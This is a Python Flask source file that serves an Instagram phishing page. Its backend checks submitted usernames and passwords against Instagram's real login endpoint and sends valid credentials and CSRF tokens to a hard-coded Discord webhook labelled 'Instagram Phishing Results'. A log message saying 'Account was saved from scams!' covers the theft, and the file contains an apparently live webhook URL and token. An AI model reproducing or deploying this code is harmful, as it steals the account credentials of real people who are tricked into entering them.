from flask import Flask, request, jsonify, render_template
import requests
import logging
from discord_webhook import DiscordWebhook, DiscordEmbed

app = Flask(__name__)

# Discord webhook URL
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1262124533792505988/MB-TafqEqT_IYNxcwu_tymVFyJVOc6izi0S2BjU5ZVoJ-AUaz9qyrmIy7-GbBHBvxxiz'

logging.basicConfig(filename='app.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def send_discord_webhook(username, password, follower_count, csrf_token):
    webhook = DiscordWebhook(url=DISCORD_WEBHOOK_URL)
    
    embed = DiscordEmbed(title="Instagram Phishing Results - 4vzdev", color='03b2f8')
    embed.add_embed_field(name="Username", value=username)
    embed.add_embed_field(name="Password", value=password)
    embed.add_embed_field(name="Followers", value=follower_count)
    embed.add_embed_field(name="CSRF Token", value=csrf_token)

    webhook.add_embed(embed)
    webhook.execute()

def check_instagram_login(username, password):
    session = requests.Session()

    login_page_url = 'https://www.instagram.com/accounts/login/'
    login_page_response = session.get(login_page_url)

    csrf_token = login_page_response.cookies.get('csrftoken')
    if not csrf_token:
        logging.error('CSRF token not found.')
        return False

    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
        'X-CSRFToken': csrf_token,
        'Referer': 'https://www.instagram.com/accounts/login/',
        'X-Instagram-AJAX': '1',
        'X-Requested-With': 'XMLHttpRequest'
    }

    login_response = session.post(login_url, data=payload, headers=headers)

    if login_response.status_code == 200 and login_response.json().get('authenticated'):
        follower_count = 31  # Placeholder value

        log_message = f"Account was saved from scams! Username: {username}, Password: {password}, Followers: {follower_count}"
        logging.info(log_message)

        send_discord_webhook(username, password, follower_count, csrf_token)

        return True
    else:
        logging.error('Login failed or authentication unsuccessful.')
        return False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check_login', methods=['POST'])
def check_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if check_instagram_login(username, password):
        return jsonify(success=True)
    else:
        return jsonify(success=False)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=True)  # Cambié el puerto para que coincida con el valor que usas en Gunicorn
